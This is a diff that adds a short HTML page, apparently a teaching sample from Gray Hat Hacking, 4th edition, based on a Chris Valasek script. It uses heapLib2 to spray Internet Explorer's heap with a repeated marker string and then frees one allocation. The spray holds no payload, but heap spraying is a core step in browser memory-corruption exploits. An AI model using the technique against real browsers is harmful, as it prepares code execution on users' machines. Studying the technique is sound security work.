@@ -1,0 +1,30 @@
+<!--Slighly modified and based on Chris Valasek script -->
+<!DOCTYPE html>
+<html>
+
+<head>
+<script type="text/javascript" src="heapLib2.js"></script>
+</head>
+<body>
+<h1 id="wonk" data-wonk="wonky">honk</h1>
+
+<script type="text/javascript">
+    var obj = document.getElementById("wonk");
+        
+    //Create a heapLib2 object for Internet Explorer    
+    var heap = new heapLib2.ie(obj, 0x80000); 
+    var i = 0; 
+    var spray = unescape("%u5247%u5941%u4148%u5F54%u4148%u4B43%u4E49%u5F47%u5434%u2148");//GRAYHAT_HACKING_4TH!
+
+    while(spray.length < 0x20000) { spray += spray } 
+    
+    for (var i = 0; i < 0x500; i++){
+            //this will bypass the cache allocator
+            heap.sprayalloc("big_attr"+i, spray); 
+    }
+    heap.free("big_attr0");
+    alert("HeapLib2 done");
+</script>
+</body>
+
+</html>
